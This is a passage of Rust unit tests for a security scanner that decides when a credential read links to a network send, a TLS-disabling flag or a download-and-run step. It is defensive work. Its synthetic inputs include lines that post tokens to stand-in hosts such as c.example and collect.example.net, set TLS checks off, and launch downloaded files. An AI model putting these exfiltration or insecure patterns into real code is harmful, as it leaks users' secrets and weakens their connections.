        let findings_a = vec![f("CRED-012", 1), f("KWARG-001", 2)];
        assert_eq!(apply(&[above_rule()], &findings_a, &lines).len(), 1);
        // ... but a line below that does not use the agent is another
        // statement.
        let other = "const token = readSecret();\nconst agent = makeAgent({ flag: off });\nconst gh = new Octokit({ auth: token });\n";
        let lines: Vec<&str> = other.lines().collect();
        assert!(apply(&[above_rule()], &findings_a, &lines).is_empty());
        // A source below the sink inside the same call.
        let below =
            "resp = post(\n    url,\n    flag=off,\n    headers={\"A\": read_secret()},\n)\n";
        let lines: Vec<&str> = below.lines().collect();
        let findings_b = vec![f("CRED-012", 4), f("KWARG-001", 3)];
        assert_eq!(apply(&[above_rule()], &findings_b, &lines).len(), 1);
        // For a rule without a window above, the order rule still applies.
        let legacy = CorrelationRule {
            sink_window_before: 0,
            ..above_rule()
        };
        assert!(apply(&[legacy], &findings_b, &lines).is_empty());
    }

    #[test]
    fn leading_and_assigned_names() {
        assert_eq!(leading_name("const agent = x;"), Some(("agent", false)));
        assert_eq!(
            leading_name("    self.session.headers.update(h)"),
            Some(("session", true))
        );
        assert_eq!(leading_name("  requests.get(u)"), Some(("requests", false)));
        assert_eq!(leading_name("  )"), None);
        assert_eq!(
            assigned_name("session.headers[\"A\"] = t"),
            Some(("session", false))
        );
        assert_eq!(assigned_name("tr := &http.Transport{"), Some(("tr", false)));
        assert_eq!(
            assigned_name("let mut c: Client = build();"),
            Some(("c", false))
        );
        assert_eq!(assigned_name("this.agent = a;"), Some(("agent", true)));
        assert_eq!(assigned_name("if session.verify == False:"), None);
        assert_eq!(assigned_name("requests.get(url, flag=off)"), None);
    }

    #[test]
    fn a_long_line_is_not_linked_when_the_rule_caps_it() {
        // One minified line holds a credential read and the insecure flag
        // far apart: a same-line link says nothing there.
        let bundle = format!(
            "var t=read_secret();{}var a=makeAgent({{flag:off}});",
            "function p(){return 0}".repeat(40)
        );
        let lines = vec![bundle.as_str()];
        let findings = vec![f("CRED-012", 1), f("KWARG-001", 1)];
        assert_eq!(apply(&[above_rule()], &findings, &lines).len(), 1);
        let capped = CorrelationRule {
            max_line_length: 500,
            ..above_rule()
        };
        assert!(apply(std::slice::from_ref(&capped), &findings, &lines).is_empty());
        // A short line under the cap still links on the same line.
        let short = ["resp = client.post(url, headers=auth(read_secret()), flag=off)"];
        assert_eq!(apply(&[capped], &findings, &short).len(), 1);
    }

    #[test]
    fn continuation_block_and_window() {
        // A black-formatted call: the run above the sink is the call.
        let call = [
            "token = read_secret()",
            "resp = client.get(",
            "    url,  # the endpoint",
            "    headers=auth(token),",
            "    flag=off,",
            ")",
            "after()",
        ];
        assert_eq!(continuation_start(&call, 5, 10), 2);
        assert_eq!(continuation_start(&call, 5, 2), 3, "bounded by `before`");
        assert_eq!(continuation_start(&call, 5, 0), 5);
        let s = statement_scope(&call, 5, 10);
        assert_eq!((s.start, s.end), (2, 6));
        // Line 1 assigns `token`, a local the call uses: set-up, kept.
        assert_eq!(
            s.text,
            "token = read_secret()\nresp = client.get(\n    url,  # the endpoint\n    headers=auth(token),\n    flag=off,\n)"
        );
        // `after()` does not use `resp`, the name the statement binds.
        assert!(!s.text.contains("after"));
        assert_eq!(arg_window(&call, 5), "    flag=off,\n)\nafter()");
        assert_eq!(arg_window(&call, 0), "");
        assert_eq!(arg_window(&call, 20), "");
        assert_eq!(statement_scope(&call, 0, 5).text, "");
        assert_eq!(statement_scope(&call, 20, 5).text, "");
        // Object literals continue; blocks do not.
        for open in [
            "const options = {",
            "  headers: {",
            "new https.Agent({",
            "tr := &http.Transport{",
            "  return {",
            "{",
            "items = [",
            "x = f(a, \\",
        ] {
            assert!(continues_into_next(open), "{open}");
        }
        for stmt in [
            "function makeAgent(token) {",
            "const f = () => {",
            "class Client {",
            "} else {",
            "func newClient() *http.Client {",
            "client = Vendor(api_key=api_key)",
            "const gh = new Octokit({ auth: token });",
            "def fetch(url, token):",
            "",
            "headers = {\"X\": \"a\"}  # trailing, comment,",
        ] {
            assert!(!continues_into_next(stmt), "{stmt}");
        }
        assert_eq!(strip_trailing_comment("a,  // b,"), "a, ");
        assert_eq!(
            strip_trailing_comment("u = \"https://x/#y\","),
            "u = \"https://x/#y\","
        );
        assert_eq!(
            strip_trailing_comment("this.#agent = x,"),
            "this.#agent = x,"
        );
    }

    #[test]
    fn contains_word_is_whole_word() {
        assert!(contains_word("json={\"k\": api_key}", "api_key"));
        assert!(!contains_word("json={\"k\": api_key2}", "api_key"));
        assert!(!contains_word("my_api_key", "api_key"));
    }

    #[test]
    fn uses_word_skips_parameter_names_and_keys() {
        // Values.
        for (text, ident) in [
            ("get(u, headers=headers, flag=off)", "headers"),
            ("get(u, auth=(user, token))", "token"),
            ("{ auth: token }", "token"),
            ("{ agent, headers }", "agent"),
            ("f\"Bearer {token}\"", "token"),
            ("x = cond ? token : other", "token"),
            ("if token == other:", "token"),
            ("print(api_key[:4])", "api_key"),
            ("session.get(url)", "session"),
            ("  token,", "token"),
        ] {
            assert!(uses_word(text, ident), "{text}");
        }
        // Names given to something else.
        for (text, ident) in [
            (
                "get(u, headers={\"Accept\": \"json\"}, flag=off)",
                "headers",
            ),
            ("Client(url=U, token=role_token)", "token"),
            ("Client(url = U, token = role_token)", "token"),
            ("new Agent({ token: \"public\" })", "token"),
            ("params={\"token\": \"public\"}", "token"),
            ("{'token': 1}", "token"),
            ("    token=role_token,", "token"),
            ("  token: 'x',", "token"),
            ("token = other", "token"),
            ("const f = token => 1", "token"),
            ("my_token = 1", "token"),
        ] {
            assert!(!uses_word(text, ident), "{text}");
        }
        // One use among the names is enough.
        assert!(uses_word("post(u, token=token)", "token"));
        assert!(!uses_word("anything", ""));
        // A Rust path is not a key.
        assert!(uses_word("let c = token::parse(s);", "token"));
    }

    #[test]
    fn keyed_literals_and_group_paths() {
        for line in [
            "\"metrics\": {\"url\": u, \"verify_ssl\": off},",
            "headers={\"Authorization\": token},",
            "ssl: { rejectUnauthorized: off },",
            "'x': [1, 2]",
            "key = (a, b);",
        ] {
            assert!(is_keyed_literal(line.as_bytes()), "{line}");
        }
        for line in [
            "headers={\"A\": t}, flag=off,",
            "ssl: cond ? { flag: off } : off,",
            "connectionString: read_secret(),",
            "agent: new Agent({ flag: off }),",
            "a == {b}",
            "f => {x}",
            "{ a: 1 },",
            "SERVICES = {",
            "\"unclosed: {",
            "",
        ] {
            assert!(!is_keyed_literal(line.as_bytes()), "{line}");
        }
        let call = [
            "resp = post(",                  // [] then opens 0
            "    url,",                      // [0]
            "    headers={",                 // [0] then opens 1
            "        \"A\": read_secret(),", // [0, 1]
            "    },",                        // closes 1: [0]
            "    body={\"a\": \"(\"},  # (", // keyed literal: [0, 3]
            "    flag=off,",                 // [0]
            ")",                             // []
        ];
        assert_eq!(
            group_paths(&call, 1, 8),
            vec![
                vec![],
                vec![0],
                vec![0],
                vec![0, 1],
                vec![0],
                vec![0, 3],
                vec![0],
                vec![]
            ]
        );
        let scope = SinkScope {
            start: 1,
            end: 8,
            text: String::new(),
            groups: group_paths(&call, 1, 8),
        };
        // The headers literal is inside the call the sink is an argument of.
        assert!(scope.same_call(4, 7));
        assert!(scope.same_call(1, 7));
        // Two keyed literals are siblings; the sink line itself is not
        // "another line"; a line outside the statement is not in it.
        assert!(!scope.same_call(4, 6));
        assert!(!scope.same_call(7, 7));
        assert!(!scope.same_call(9, 7));
        // Outside the statement mode there is no group, and nothing links
        // by being in the call.
        assert!(!SinkScope::line(7, String::new()).same_call(6, 7));
    }

    #[test]
    fn keyword_names_do_not_link_in_the_statement_mode() {
        // `headers` is bound from the key; the insecure call has its own
        // `headers=` literal, and `headers = {...}` two lines up joined the
        // window only because the statement named a `headers` keyword.
        let src = "headers = {\"A\": read_secret()}\nr1 = get(api, headers=headers)\nr2 = get(status, headers={\"Accept\": \"json\"}, flag=off)\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("KWARG-001", 3)];
        assert!(apply(&[above_rule()], &findings, &lines).is_empty());
        // The same file under a rule without the statement mode still links
        // the old way (a name anywhere in the argument window).
        let legacy = CorrelationRule {
            sink_window_before: 0,
            ..above_rule()
        };
        assert_eq!(apply(&[legacy], &findings, &lines).len(), 1);
        // Passed as a value, it links.
        let used =
            "headers = {\"A\": read_secret()}\nr2 = get(status, headers=headers, flag=off)\n";
        let lines_u: Vec<&str> = used.lines().collect();
        let findings_u = vec![f("CRED-012", 1), f("KWARG-001", 2)];
        assert_eq!(apply(&[above_rule()], &findings_u, &lines_u).len(), 1);
    }

    #[test]
    fn sibling_literals_of_one_statement_do_not_link() {
        let config = [
            "module.exports = {",
            "  vendor: {",
            "    apiKey: read_secret(),",
            "  },",
            "  db: {",
            "    ssl: { flag: off },",
            "  },",
            "};",
        ];
        let findings = vec![f("CRED-012", 3), f("KWARG-001", 6)];
        assert!(apply(&[above_rule()], &findings, &config).is_empty());
        // The credential in the object whose nested options turn the check
        // off is one connection's configuration.
        let pool = [
            "const pool = new Pool({",
            "  connectionString: read_secret(),",
            "  ssl: {",
            "    flag: off,",
            "  },",
            "});",
        ];
        let findings = vec![f("CRED-012", 2), f("KWARG-001", 4)];
        assert_eq!(apply(&[above_rule()], &findings, &pool).len(), 1);
        // The cost: an options object whose headers and TLS options are
        // sibling literals (got's `https: { rejectUnauthorized: false }`
        // beside `headers: {...}`) is one request, and is not linked either.
        // The TLS finding itself is still reported.
        let got = [
            "const options = {",
            "  headers: { A: read_secret() },",
            "  https: { flag: off },",
            "};",
        ];
        let findings = vec![f("CRED-012", 2), f("KWARG-001", 3)];
        assert!(apply(&[above_rule()], &findings, &got).is_empty());
    }

    /// `rule()` as the pack states EXFIL-CHAIN-001: names read as values.
    fn value_rule() -> CorrelationRule {
        CorrelationRule {
            name_uses: Some(NameUses::Value),
            ..rule()
        }
    }

    /// `rule()` with the reading the legacy chains used before `name_uses`.
    fn word_rule() -> CorrelationRule {
        CorrelationRule {
            name_uses: Some(NameUses::Word),
            ..rule()
        }
    }

    /// Does `rule` link a source that binds `name` on line 1 to a sink call
    /// that starts on line 2 (in a Python file)?
    fn links(rule: &CorrelationRule, name: &str, sink: &str) -> bool {
        links_in("a.py", rule, name, sink)
    }

    /// [`links`] in a file called `file`, whose extension says what is code.
    fn links_in(file: &str, rule: &CorrelationRule, name: &str, sink: &str) -> bool {
        let src = format!("{name} = read_secret()\n{sink}\n");
        !chains_in(file, rule, &src, 1, 2).is_empty()
    }

    /// The chains `rule` makes in `src`, read as the file `file`, between a
    /// CRED-012 source on `source` and a NET-001 sink on `sink` (1-based).
    fn chains_in(
        file: &str,
        rule: &CorrelationRule,
        src: &str,
        source: usize,
        sink: usize,
    ) -> Vec<Finding> {
        let lines: Vec<&str> = src.lines().collect();
        let at = |rule: &str, line: usize| Finding {
            file: file.to_string(),
            ..f(rule, line)
        };
        let findings = vec![at("CRED-012", source), at("NET-001", sink)];
        apply(std::slice::from_ref(rule), &findings, &lines)
    }

    /// The reported false positive: `url` is bound from a credential read and
    /// handed to `create_engine`; the later `requests.get(url=...)` names its
    /// parameter `url` and sends `base + "/ping"`. Read as words, it was a
    /// Critical EXFIL-CHAIN-001.
    #[test]
    fn a_keyword_name_is_not_the_bound_value() {
        let src = "import os\nimport requests\n\nurl = read_secret()\nengine = create_engine(url)\n\n\ndef ping(base):\n    return requests.get(url=base + \"/ping\")\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-001", 4), f("NET-001", 9)];
        assert!(apply(&[value_rule()], &findings, &lines).is_empty());
        let chains = apply(&[word_rule()], &findings, &lines);
        assert_eq!(chains.len(), 1, "{chains:#?}");
        assert!(chains[0]
            .snippet
            .contains("CRED-001 (@L4) reaches NET-001 (@L9)"));
        // Unset, outside the statement mode, is the word reading.
        assert_eq!(apply(&[rule()], &findings, &lines).len(), 1);
    }

    #[test]
    fn names_and_keys_that_repeat_the_bound_name_do_not_link() {
        for (name, sink) in [
            ("url", "requests.get(url=base + \"/ping\")"),
            ("url", "requests.get(url = base)"),
            ("token", "requests.post(u, json={\"token\": \"x\"})"),
            ("token", "requests.post(u, json={'token': 'x'})"),
            (
                "url",
                "requests.get(\n    url=status_base,\n    timeout=5,\n)",
            ),
            (
                "token",
                "requests.post(\n    u,\n    json={\n        \"token\": \"x\",\n    },\n)",
            ),
        ] {
            assert!(!links(&value_rule(), name, sink), "{sink}");
            assert!(links(&word_rule(), name, sink), "word reading: {sink}");
        }
        // An object key in JavaScript names the property.
        let js = "axios.post(u, { token: \"anonymous\" })";
        assert!(!links_in("a.js", &value_rule(), "token", js));
        assert!(links_in("a.js", &word_rule(), "token", js));
        // The same text in Python is a dict whose key is the variable's value.
        assert!(links_in("a.py", &value_rule(), "token", js));
    }

    #[test]
    fn the_value_side_still_links() {
        for (name, sink) in [
            ("api_key", "requests.post(u, json={\"k\": api_key})"),
            ("token", "requests.post(u, data=token)"),
            ("token", "requests.get(f\"https://c.example/?t={token}\")"),
            ("token", "requests.post(u, token)"),
            ("token", "requests.post(u, token=token)"),
            ("token", "requests.get(u, params={\"token\": token})"),
            ("token", "fetch(u, { method: \"POST\", body: token })"),
            ("token", "axios.post(u, { token })"),
            ("token", "axios.post(u, { token, source })"),
            (
                "secret",
                "requests.post(\n    u,\n    data={\"s\": secret},\n)",
            ),
        ] {
            assert!(links(&value_rule(), name, sink), "{sink}");
            assert!(links(&word_rule(), name, sink), "word reading: {sink}");
        }
        // An auth header uses the name. What keeps EXFIL-CHAIN-001 quiet on
        // it is the rule's `sink_excludes`, under either reading.
        let header = "requests.post(u, headers={\"Authorization\": token})";
        let no_excludes = CorrelationRule {
            sink_excludes: vec![],
            ..value_rule()
        };
        assert!(links(&no_excludes, "token", header));
        assert!(!links(&value_rule(), "token", header));
        assert!(!links(&word_rule(), "token", header));
    }

    /// A replacement field sends its expression whatever follows it: a format
    /// spec (`{token:>40}`, `{token:s}`, `{token:{width}}`), a conversion
    /// (`{token!r}`), or Python's self-documenting `=` (`{token=}`), in an
    /// f-string or in a plain string formatted with `locals()`. (Before the
    /// string was read as a string, the first and last read as a key and a
    /// keyword name, and did not link.)
    #[test]
    fn format_fields_send_the_value() {
        for sink in [
            "requests.get(f\"https://c.example/?{token=}\")",
            "requests.get(f\"https://c.example/?{token=!r}\")",
            "requests.get(f\"https://c.example/?t={token:>40}\")",
            "requests.get(f\"https://c.example/?t={token:s}\")",
            "requests.get(f\"https://c.example/?t={token:}\")",
            "requests.get(f\"https://c.example/?t={token:.200}\")",
            "requests.get(f\"https://c.example/?t={token:{width}}\")",
            "requests.get(f\"https://c.example/?t={token :s}\")",
            "requests.get(f\"https://c.example/?t={token!r}\")",
            "requests.get(f\"https://c.example/?t={token!s:>40}\")",
            "requests.post(u, data=f\"leak={token:s}\")",
            "requests.post(u, json={\"content\": f\"`{token:<70}`\"})",
            "requests.get(\"https://c.example/?t={token:s}\".format(**locals()))",
            "requests.get(\"https://c.example/?t=%(token)s\" % locals())",
        ] {
            assert!(links(&value_rule(), "token", sink), "{sink}");
        }
        assert!(links_in(
            "a.js",
            &value_rule(),
            "token",
            "fetch(`https://c.example/?t=${token}`)"
        ));
        // A field of a plain string that is not formatted from the local
        // names is text, and so is an escaped brace.
        for sink in [
            "requests.get(\"https://c.example/?t={token}\")",
            "requests.get(f\"https://c.example/?t={{token}}\")",
        ] {
            assert!(!links(&value_rule(), "token", sink), "{sink}");
        }
    }

    /// A launch links through the file the download wrote, named on the launch
    /// line. An environment key or keyword on that line that shares the
    /// path's name (`env={"PATH": ...}` after `open(PATH, 'wb')`) is not the
    /// program it runs.
    #[test]
    fn a_launch_line_key_does_not_link_a_written_path() {
        let by_value = CorrelationRule {
            name_uses: Some(NameUses::Value),
            ..launch_rule()
        };
        let by_word = CorrelationRule {
            name_uses: Some(NameUses::Word),
            ..launch_rule()
        };
        let findings = vec![f("NET-002", 1), f("CODE-RUNFILE-001", 3)];
        let with_launch = |launch: &str| {
            format!(
                "with urlopen(req) as response, open(PATH, 'wb') as out_file:\n    out_file.write(response.read())\n{launch}\n"
            )
        };
        for launch in [
            "run([interp, build_script], env={\"PATH\": \"/usr/bin\"})",
            "run([interp, build_script], env=dict(base_env, PATH=bin_dir))",
        ] {
            let src = with_launch(launch);
            let lines: Vec<&str> = src.lines().collect();
            assert!(
                apply(std::slice::from_ref(&by_value), &findings, &lines).is_empty(),
                "{launch}"
            );
            assert_eq!(
                apply(std::slice::from_ref(&by_word), &findings, &lines).len(),
                1,
                "word reading: {launch}"
            );
        }
        // `run([interp, ...])` is not a launch shape [`launched_operands`]
        // knows, so the launch line is read by value as a whole. (The
        // program-operand reading of the real launch rule is tested in
        // `corpus::engine::reconcile`, a file the self-scan skips.)
        assert!(launched_operands("run([interp, PATH])").is_empty());
        for launch in [
            "run([interp, PATH])",
            "run([interp, PATH], env={\"PATH\": \"/usr/bin\"})",
        ] {
            let src = with_launch(launch);
            let lines: Vec<&str> = src.lines().collect();
            assert_eq!(
                apply(std::slice::from_ref(&by_value), &findings, &lines).len(),
                1,
                "{launch}"
            );
        }
        // Only a comment on the launch line names the path.
        let src = with_launch("run([interp, build_script])  # reads PATH");
        let lines: Vec<&str> = src.lines().collect();
        assert!(apply(std::slice::from_ref(&by_value), &findings, &lines).is_empty());
        assert_eq!(
            apply(std::slice::from_ref(&by_word), &findings, &lines).len(),
            1
        );
    }

    /// The program operand of each launch shape: the program, not its
    /// arguments. (The launch strings are split so that the launch rule
    /// does not fire on this file in the self-scan.)
    #[test]
    fn launched_operands_are_the_program() {
        let py = concat!(
            "subprocess",
            ".run([sys.executable, convert_script, csv_path])"
        );
        assert_eq!(launched_operands(py), vec!["convert_script"]);
        let flags = concat!(
            "subprocess",
            ".run([\"python3\", \"-u\", stage_path], check=True)"
        );
        assert_eq!(launched_operands(flags), vec!["stage_path"]);
        let sh = concat!("    ba", "sh \"$INSTALLER\"");
        assert_eq!(launched_operands(sh), vec!["\"$INSTALLER\""]);
        let guarded = concat!("[ -s \"$CONFIG\" ] && ba", "sh \"$SETUP\"");
        assert_eq!(launched_operands(guarded), vec!["\"$SETUP\""]);
        let js = concat!("execFile", "(converter, [dataPath], cb)");
        assert_eq!(launched_operands(js), vec!["converter"]);
    }

    #[test]
    fn name_uses_unset_keeps_each_mode_as_it_was() {
        assert!(!links_by_value(&rule(), false));
        assert!(links_by_value(&rule(), true));
        for statement_mode in [false, true] {
            assert!(links_by_value(&value_rule(), statement_mode));
            assert!(!links_by_value(&word_rule(), statement_mode));
        }
        // In the statement mode an explicit `"value"` is what an unset field
        // already did (TLS-CHAIN-001 states it and behaves as before); an
        // explicit `"word"` links the keyword name again.
        let src = "headers = {\"A\": read_secret()}\nr1 = get(api, headers=headers)\nr2 = get(status, headers={\"Accept\": \"json\"}, flag=off)\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("KWARG-001", 3)];
        let value = CorrelationRule {
            name_uses: Some(NameUses::Value),
            ..above_rule()
        };
        assert!(apply(&[value], &findings, &lines).is_empty());
        let word = CorrelationRule {
            name_uses: Some(NameUses::Word),
            ..above_rule()
        };
        assert_eq!(apply(&[word], &findings, &lines).len(), 1);
    }

    // -- the attack probes (synthetic inputs; the findings are placed by
    //    hand, the full-scanner versions are in `corpus::engine::reconcile`)

    /// Does the value reading link `src` (as file `file`) from a source on
    /// `source` to a sink on `sink`?
    fn value_links(file: &str, src: &str, source: usize, sink: usize) -> bool {
        !chains_in(file, &value_rule(), src, source, sink).is_empty()
    }

    /// A parameter of the function the sink is in, with the bound name, is
    /// whatever the caller passes: `def ping(url):` is the reported example
    /// with its parameter renamed from `base` to `url`.
    #[test]
    fn a_parameter_of_the_same_name_is_another_value() {
        let def = "url = read_secret()\nengine = create_engine(url)\n\n\ndef ping(url):\n    return requests.get(url + \"/ping\", timeout=3)\n";
        assert!(!value_links("db.py", def, 1, 6));
        let lambda = "url = read_secret()\nengine = create_engine(url)\nping = lambda url: requests.get(url + \"/ping\", timeout=3)\n";
        assert!(!value_links("db.py", lambda, 1, 3));
        let one_line = "token = read_secret()\nclient = ServiceClient(token)\ndef verify(token: str) -> bool: return requests.get(HEALTH, timeout=3).ok and client.check(token)\n";
        assert!(!value_links("s.py", one_line, 1, 3));
        let method = "token = read_secret()\n\nclass Verifier:\n    def verify(self, token):\n        return requests.get(CHECK, params={\"t\": token})\n";
        assert!(!value_links("s.py", method, 1, 5));
        let arrow = "const token = readSecret();\nconst gh = new Octokit({ auth: token });\nexport const check = async (token: string): Promise<boolean> => {\n  const r = await fetch(CHECK, { method: \"POST\", body: token });\n  return r.ok;\n};\n";
        assert!(!value_links("api.ts", arrow, 1, 4));
        let callback = "const token = readSecret();\napp.post(\"/verify\", (token) => fetch(CHECK, { method: \"POST\", body: token }));\n";
        assert!(!value_links("app.js", callback, 1, 2));
        let class_method = "const token = readSecret();\nclass Api {\n  async verify(token: string) {\n    const started = Date.now();\n    const r = await fetch(CHECK, { method: \"POST\", body: token });\n    return r.ok;\n  }\n}\n";
        assert!(!value_links("api.ts", class_method, 1, 5));
        // After the method's body, the name is the bound value again.
        let after_method = "const token = readSecret();\nclass Api {\n  verify(token) {\n    return token.length > 0;\n  }\n}\nfetch(COLLECT, { method: \"POST\", body: token });\n";
        assert!(value_links("api.js", after_method, 1, 7));
        // The word reading linked every one of them.
        assert!(!chains_in("db.py", &word_rule(), def, 1, 6).is_empty());

        // The bound value does reach the parameter, or the send is outside
        // the function: these link.
        let called = "token = read_secret()\n\ndef send(token):\n    requests.post(COLLECT, data=token)\n\nsend(token)\n";
        assert!(value_links("app.py", called, 1, 4));
        // Called with the secret under a name assigned from it.
        let forwarded = "token = read_secret()\nt = token\n\ndef send(token):\n    requests.post(COLLECT, data=token)\n\nsend(t)\n";
        assert!(value_links("app.py", forwarded, 1, 5));
        // Called with something else, the parameter is something else.
        let other = "token = read_secret()\n\ndef send(token):\n    requests.post(COLLECT, data=token)\n\nsend(\"public\")\n";
        assert!(!value_links("app.py", other, 1, 4));
        let ended = "token = read_secret()\n\ndef strip(token):\n    return token.strip()\n\nrequests.post(COLLECT, data=token)\n";
        assert!(value_links("app.py", ended, 1, 6));
        let before = "token = read_secret()\nrequests.post(COLLECT, data=token, hooks={\"response\": lambda token, *a, **k: None})\n";
        assert!(value_links("app.py", before, 1, 2));
        let default = "url = read_secret()\n\ndef ping(url=url):\n    return requests.get(url + \"/ping\", timeout=3)\n";
        assert!(value_links("db.py", default, 1, 4));
        let js_called = "const token = readSecret();\nfunction send(token) {\n  return fetch(COLLECT, { method: \"POST\", body: token });\n}\nsend(token);\n";
        assert!(value_links("app.js", js_called, 1, 3));
        let js_ended = "const token = readSecret();\nfunction trim(token) {\n  return token.trim();\n}\nfetch(COLLECT, { method: \"POST\", body: token });\n";
        assert!(value_links("app.js", js_ended, 1, 5));
    }

    #[test]
    fn declared_parameters() {
        for params in [
            "url",
            "self, url",
            "url: str",
            "url: str = None",
            "*, url",
            "token?: string",
            "path: string, token?: string",
            "{ token }",
            "{ key: token }",
            "{ token = \"x\" }",
            "...url",
            "private url: string",
        ] {
            let name = if params.contains("token") {
                "token"
            } else {
                "url"
            };
            assert!(declares(params, name), "{params}");
        }
        for (params, name) in [
            ("base", "url"),
            ("url=url", "url"),
            ("opts: { token: string }", "token"),
            ("{ token: t }", "token"),
            ("my_url", "url"),
            ("cb = (url) => url", "url"),
        ] {
            assert!(!declares(params, name), "{params}");
        }
    }

    /// A word inside a string literal or a comment is not a use; what a
    /// string interpolates is.
    #[test]
    fn strings_and_comments_are_not_uses() {
        let py = |sink: &str| format!("token = read_secret()\nclient = Client(token)\n{sink}\n");
        for sink in [
            "r = requests.post(\"https://oauth2.example.com/token\", data={\"grant_type\": \"client_credentials\"})",
            "requests.post(LOGIN, data={\"grant_type\": \"password\", \"scope\": \"token\"})",
            "requests.post(LOGIN, data=\"{\\\"token\\\": \\\"anonymous\\\"}\")",
            "requests.get(STATUS)  # public: no token needed",
            "requests.get(\"https://api.example.com/graphql\", params={\"q\": \"{ token { id } }\"})",
            "requests.get(\"https://u.example.com/?u={token}\".format(token=\"public\"))",
            "requests.get(\"https://u.example.com/?%(token)s\" % {\"token\": \"public\"})",
        ] {
            assert!(!value_links("s.py", &py(sink), 1, 3), "{sink}");
        }
        let js = |sink: &str| {
            format!(
                "const token = readSecret();\nconst gh = new Octokit({{ auth: token }});\n{sink}\n"
            )
        };
        for sink in [
            "fetch(STATUS); // no token here",
            "axios.post(u, { /* anon */ token: \"anonymous\" });",
            "fetch(\"https://oauth2.example.com/token\", { method: \"POST\" });",
            "fetch(u, { body: `- token: anonymous` });",
        ] {
            assert!(!value_links("a.js", &js(sink), 1, 3), "{sink}");
        }
        // Interpolations send the value.
        for sink in [
            "requests.get(f\"https://c.example.net/?t={token}\")",
            "requests.post(COLLECT, data=\"t=\" + token)",
            "requests.post(COLLECT, data=\"t={}\".format(token))",
            "requests.post(COLLECT, data=\"t=%s\" % token)",
        ] {
            assert!(value_links("s.py", &py(sink), 1, 3), "{sink}");
        }
        assert!(value_links(
            "a.js",
            &js("fetch(`https://c.example.net/?t=${token}`);"),
            1,
            3
        ));
        let sh = "TOKEN=\"$(read_secret)\"\nfetch-tool -d \"t=$TOKEN\" \"$COLLECT\"  # sync\n";
        assert!(value_links("run.sh", sh, 1, 2));
        let sh_comment =
            "TOKEN=\"$(read_secret)\"\nfetch-tool -fsS \"$STATUS\"   # TOKEN stays local\n";
        assert!(!value_links("run.sh", sh_comment, 1, 2));
    }

    /// An attribute of another object is another name: `r.url` after `url`
    /// is bound. The object's own state and the source's receiver are the
    /// bound value.
    #[test]
    fn attributes_of_other_objects_are_not_uses() {
        let r = "url = read_secret()\nrequests.get(page, params={\"next\": r.url})\n";
        assert!(!value_links("f.py", r, 1, 2));
        let own = "self.token = read_secret()\nrequests.post(COLLECT, data=self.token)\n";
        assert!(value_links("f.py", own, 1, 2));
        let recv = "cfg.token = read_secret()\nrequests.post(COLLECT, data=cfg.token)\n";
        assert!(value_links("f.py", recv, 1, 2));
        let spread = "const token = readSecret();\naxios.post(u, [...token]);\n";
        assert!(value_links("a.js", spread, 1, 2));
    }

    #[test]
    fn destructuring_targets_and_export_lists_are_not_uses() {
        for (src, sink) in [
            ("const token = readSecret();\nexport async function login(form) {\n  const res = await fetch(LOGIN, { method: \"POST\", body: form });\n  const { token } = await res.json();\n  return token;\n}\n", 3),
            ("const token = readSecret();\nconst { token: t, user } = await fetch(LOGIN).then((r) => r.json());\n", 2),
            ("const token = readSecret();\nconst [status, token] = await check(fetch(STATUS));\n", 2),
            ("token = read_secret()\nstatus, token = requests.get(LOGIN).json()\n", 2),
        ] {
            let file = if src.contains("const") { "a.js" } else { "a.py" };
            assert!(!value_links(file, src, 1, sink), "{src}");
        }
        for line in [
            "export { token };",
            "module.exports = { token, health };",
            "export default { token }",
        ] {
            assert!(!uses_value(line, "token", Lang::CLike, None), "{line}");
        }
        // The shorthand in a call is the value.
        assert!(value_links(
            "a.js",
            "const token = readSecret();\naxios.post(u, { token });\n",
            1,
            2
        ));
        // A continuation line of a call is not a tuple assignment.
        let cont = "token = read_secret()\nrequests.post(COLLECT,\n    token, timeout=5)\n";
        assert!(value_links("a.py", cont, 1, 2));
    }

    #[test]
    fn typescript_members_are_names() {
        for member in [
            "export async function call(path: string, token?: string) {",
            "  private token: string;",
            "export interface Opts { url: string; token: string }",
            "  readonly token!: string;",
        ] {
            let src = format!("const token = readSecret();\nexport const health = () => fetch(STATUS,\n{member}\n);\n");
            assert!(!value_links("api.ts", &src, 1, 2), "{member}");
        }
    }

    /// The window is the sink's own statement: the next function's header,
    /// a docstring or a log line after it is something else.
    #[test]
    fn the_window_ends_with_the_call() {
        for after in [
            "\n\ndef connect(url):\n    return create_engine(url)",
            "\n    \"\"\"Rotate the url stored in the vault.\"\"\"",
            "\nlog.debug(f\"health={r.status_code} url_len={len(url)}\")",
            "\nuser = session.query(User).filter(User.url == url).first()",
            "\n__all__ = [\"url\", \"health\"]",
        ] {
            let src = format!("url = read_secret()\n\ndef health():\n    r = requests.get(STATUS, timeout=3){after}\n");
            assert!(!value_links("db.py", &src, 1, 4), "{after}");
            assert!(
                !chains_in("db.py", &word_rule(), &src, 1, 4).is_empty(),
                "word reading: {after}"
            );
        }
        // A call that continues onto the next lines carries its arguments
        // there.
        let multi = "url = read_secret()\nrequests.post(\n    COLLECT,\n    data=url,\n)\n";
        assert!(value_links("db.py", multi, 1, 2));
        // A destination the sink line names is used by the lines below it.
        let dest = "data = read_secret()\nurl = \"https://collect.example.net/c\"\nreq = Request(url, data=data)\n";
        let lines: Vec<&str> = dest.lines().collect();
        let findings = vec![
            Finding {
                file: "s.py".to_string(),
                ..f("CRED-012", 1)
            },
            Finding {
                file: "s.py".to_string(),
                ..f("NET-007", 2)
            },
        ];
        let net7 = CorrelationRule {
            sink: FindingSelector {
                rule_prefixes: vec![],
                rule_ids: vec!["NET-007".to_string()],
            },
            ..value_rule()
        };
        assert_eq!(apply(&[net7], &findings, &lines).len(), 1);
    }

    /// A variable reference, a Python dict key and a ternary operand are the
    /// value, whatever follows them.
    #[test]
    fn references_expression_keys_and_operands_are_uses() {
        for sink in [
            "fetch-tool -d \"k=${TOKEN:-}\" \"$COLLECT\"",
            "fetch-tool -d \"${TOKEN:?unset}\" \"$COLLECT\"",
            "fetch-tool -d \"${TOKEN:0:64}\" \"$COLLECT\"",
            "fetch-tool -d \"${TOKEN=none}\" \"$COLLECT\"",
            "fetch-tool -d \"$TOKEN=1\" \"$COLLECT\"",
            "fetch-tool \"$COLLECT?t=${TOKEN:-none}\"",
        ] {
            assert!(links_in("run.sh", &value_rule(), "TOKEN", sink), "{sink}");
        }
        for sink in [
